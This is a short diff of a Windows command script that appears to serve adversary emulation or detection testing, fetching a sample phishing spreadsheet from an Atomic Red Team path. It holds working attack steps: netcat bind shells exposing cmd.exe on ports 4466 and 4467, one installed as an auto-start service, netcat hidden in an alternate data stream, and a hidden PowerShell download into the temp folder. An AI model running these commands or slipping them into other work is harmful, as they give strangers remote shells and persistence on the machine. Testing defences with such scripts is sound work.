@@ -16,7 +16,8 @@ type %Temp%\nc.txt > %Temp%\README.txt:hid.txt
 sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
 
 start calc
+%Temp%\nc64.exe -nLvp 4466 -e cmd.exe
 
 powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true','%Temp%\s.xlsm')"
 
-%Temp%\nc64.exe -nLvp 4466 -e cmd.exe
+
